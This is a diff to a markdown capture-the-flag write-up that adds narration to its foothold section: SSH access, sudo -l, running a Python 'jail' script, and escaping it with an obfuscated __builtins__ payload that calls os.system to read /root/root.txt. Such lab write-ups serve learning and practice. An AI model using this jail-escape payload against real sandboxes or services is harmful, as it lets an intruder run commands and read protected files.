@@ -164,8 +164,11 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session completed
 ```
 
-## 2. Foothild
+## 2. Foothold
 
+Using this to ssh, we are in! 
+
+Let's do some exploration.
 ```
 {username}@vagrant:~$ sudo -l
 [sudo] password for {username}: 
@@ -204,6 +207,9 @@ if __name__ == "__main__":
 ```
 
 ```
+{username}@vagrant:~$ python3 jail.py
+Hi! Welcome to my world kaneki
+========================================================================
 What ? You gonna stand like a chicken ? fight me Kaneki
 >>> hi
 Traceback (most recent call last):
@@ -215,12 +221,16 @@ Traceback (most recent call last):
 NameError: name 'hi' is not defined
 ```
 
+Uh okay, so cheap trick, let's see if sneaking in works.
 ```
 >>> "cat root/root.txt"
 No Kaneki you are so dead
 ```
 
+Apparently not. What we need to do is import os and spawn a shell, or, just cat the `root/root.txt` file. But, for that, we need to somehow make python execute shell code. How? Python has a built in function `exec()` that does just that. So, all we need to do is **python3 jail-break**. [Look up here for more information](https://anee.me/escaping-python-jails-849c65cf306e). 
+
 ```
 __builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('cat /root/root.txt')
 ```
+
 And we are done!
